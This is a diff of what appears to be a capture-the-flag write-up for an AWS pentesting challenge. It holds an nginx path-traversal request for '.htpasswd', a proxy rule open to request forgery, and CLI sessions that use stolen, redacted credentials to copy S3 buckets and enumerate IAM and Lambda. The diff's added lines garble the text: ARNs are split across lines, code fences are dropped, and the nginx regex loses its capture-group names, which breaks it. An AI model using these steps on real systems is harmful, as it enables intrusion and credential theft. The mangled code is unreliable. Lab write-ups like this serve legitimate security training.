@@ -8,45 +8,20 @@
 location /assets {
  alias /usr/share/static/;
  }
-```
-
-
-
-```
 GET /assets../secret/.htpasswd HTTP/1.1
 Host: apjweb.scjdaysctf2023.net
 Connection: close
-```
-
-
-
-```
-location ~^/admin/proxy/(?<proxy_host>.*?)/(?<proxy_path>.*)$ {
+location ~^/admin/proxy/(?.*?)/(?.*)$ {
  proxy_pass http://$proxy_host/$proxy_path;
  proxy_set_header Host $proxy_host;
  }
-```
-
-
-
-```
 "AccessKeyId" : "[REDACTED]",
  "SecretAccessKey" : "[REDACTED]",
  "Token" : "[REDACTED]",
-```
-
-
-
-```
 [ctf-hard-aws-pentesting-journey]
 aws_access_key_id = [REDACTED]
 aws_secret_access_key = [REDACTED]
 aws_session_token = [REDACTED]
-```
-
-
-
-```
 $ aws s3 ls --profile ctf-hard-aws-pentesting-journey
 2023-08-13 23:13:07 backup-37szjp8pny7xx01
 2023-08-26 22:43:13 camouflagedrop-wxhqft4lqf-assets-wxhqft4lqf-assets
@@ -67,11 +42,6 @@ $ aws s3 ls s3://backup-37szjp8pny7xx01 --profile ctf-hard-aws-pentesting-journe
 2023-08-14 03:02:43 99 dboperator_accessKeys.csv
 
 $ aws s3 cp s3://backup-37szjp8pny7xx01 . --profile ctf-hard-aws-pentesting-journey --recursive
-```
-
-
-
-```
 $ aws configure --profile ctf-hard-aws-pentesting-journey-dboperator
 AWS Access Key ID [None]: [REDACTED]
 AWS Secret Access Key [None]: [REDACTED]
@@ -82,7 +52,11 @@ $ aws sts get-caller-identity --profile ctf-hard-aws-pentesting-journey-dboperat
 {
  "UserId": "[REDACTED]",
  "Account": "[REDACTED]",
- "Arn": "arn:aws:iam::055450064556:user/dboperator"
+ "Arn": "arn:
+aws:
+iam::
+055450064556:
+user/dboperator"
 }
 
 $ aws iam list-attached-user-policies --user-name dboperator --profile ctf-hard-aws-pentesting-journey-dboperator
@@ -90,17 +64,29 @@ $ aws iam list-attached-user-policies --user-name dboperator --profile ctf-hard-
  "AttachedPolicies": [
  {
  "PolicyName": "dboperator",
- "PolicyArn": "arn:aws:iam::055450064556:policy/dboperator"
+ "PolicyArn": "arn:
+aws:
+iam::
+055450064556:
+policy/dboperator"
  }
  ]
 }
 
-$ aws iam get-policy --policy-arn arn:aws:iam::055450064556:policy/dboperator --profile ctf-hard-aws-pentesting-journey-dboperator
+$ aws iam get-policy --policy-arn arn:
+aws:
+iam::
+055450064556:
+policy/dboperator --profile ctf-hard-aws-pentesting-journey-dboperator
 {
  "Policy": {
  "PolicyName": "dboperator",
  "PolicyId": "[REDACTED]",
- "Arn": "arn:aws:iam::055450064556:policy/dboperator",
+ "Arn": "arn:
+aws:
+iam::
+055450064556:
+policy/dboperator",
  "Path": "/",
  "DefaultVersionId": "v6",
  "AttachmentCount": 1,
@@ -112,7 +98,11 @@ $ aws iam get-policy --policy-arn arn:aws:iam::055450064556:policy/dboperator --
  }
 }
 
-$ aws iam get-policy-version --version-id v6 --policy-arn arn:aws:iam::055450064556:policy/dboperator --profile ctf-hard-aws-pentesting-journey-dboperator
+$ aws iam get-policy-version --version-id v6 --policy-arn arn:
+aws:
+iam::
+055450064556:
+policy/dboperator --profile ctf-hard-aws-pentesting-journey-dboperator
 {
  "PolicyVersion": {
  "Document": {
@@ -121,21 +111,38 @@ $ aws iam get-policy-version --version-id v6 --policy-arn arn:aws:iam::055450064
  {
  "Effect": "Allow",
  "Action": [
- "lambda:List*",
- "lambda:GetFunction",
- "lambda:InvokeFunction"
+ "lambda:
+List*",
+ "lambda:
+GetFunction",
+ "lambda:
+InvokeFunction"
  ],
- "Resource": "arn:aws:lambda:ap-northeast-1:055450064556:function:db-buckup*"
+ "Resource": "arn:
+aws:
+lambda:ap-northeast-1:
+055450064556:
+function:db-buckup*"
  },
  {
  "Effect": "Allow",
  "Action": [
- "iam:Get*",
- "iam:List*"
+ "iam:
+Get*",
+ "iam:
+List*"
  ],
  "Resource": [
- "arn:aws:iam::055450064556:policy/dboperator",
- "arn:aws:iam::055450064556:user/dboperator"
+ "arn:
+aws:
+iam::
+055450064556:
+policy/dboperator",
+ "arn:
+aws:
+iam::
+055450064556:
+user/dboperator"
  ]
  }
  ]
@@ -146,20 +153,23 @@ $ aws iam get-policy-version --version-id v6 --policy-arn arn:aws:iam::055450064
  }
 }
 
-$ aws lambda get-function --function-name 'arn:aws:lambda:ap-northeast-1:055450064556:function:db-buckup' --profile ctf-hard-aws-pentesting-journey-dboperator
+$ aws lambda get-function --function-name 'arn:
+aws:
+lambda:ap-northeast-1:
+055450064556:
+function:db-buckup' --profile ctf-hard-aws-pentesting-journey-dboperator
 
 "Location": "[REDACTED]"
-```
-
-
-
-```
 $ aws lambda list-versions-by-function --function-name 'db-buckup' --profile ctf-hard-aws-pentesting-journey-dboperator
 
 "Version": "1",
 "Version": "2",
 
-$ aws lambda get-function --function-name 'arn:aws:lambda:ap-northeast-1:055450064556:function:db-buckup' --profile ctf-hard-aws-pentesting-journey-dboperator --qualifier 1
+$ aws lambda get-function --function-name 'arn:
+aws:
+lambda:ap-northeast-1:
+055450064556:
+function:db-buckup' --profile ctf-hard-aws-pentesting-journey-dboperator --qualifier 1
 ...
 "Location": "[REDACTED]"
 ```
